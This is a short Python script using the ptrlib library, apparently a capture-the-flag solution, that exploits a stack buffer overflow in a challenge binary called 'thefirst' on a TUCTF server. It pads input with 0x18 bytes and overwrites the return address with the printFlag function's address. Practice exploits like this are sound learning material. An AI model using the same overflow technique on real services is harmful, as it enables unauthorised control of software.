from ptrlib import *

elf = ELF("./thefirst")
#sock = Process("./thefirst")
sock = Socket("chal.tuctf.com", 30508)

payload = b'A' * 0x18
payload += p32(elf.symbol('printFlag'))
sock.sendlineafter("> ", payload)

sock.interactive()
